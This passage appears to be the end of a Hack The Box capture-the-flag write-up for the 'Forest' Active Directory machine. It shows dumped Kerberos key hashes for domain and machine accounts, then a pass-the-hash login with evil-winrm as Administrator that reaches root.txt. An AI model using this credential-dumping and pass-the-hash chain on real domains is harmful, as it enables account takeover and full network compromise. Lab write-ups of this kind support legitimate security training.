htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:1c078a79816a5dd411f307e6446ac905d6750455d26e532ae18d0c18a26b0ec7
FOREST$:aes128-cts-hmac-sha1-96:7fcf337903b28ad8f1901072cc3b428f
FOREST$:des-cbc-md5:d6e6fb4abc8685a8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

Use the domain administrator's NTLM hash to access the machine.

```bash
$ evil-winrm -i 10.129.242.130 -u htb.local\\Administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2021  11:14 AM             34 root.txt
```
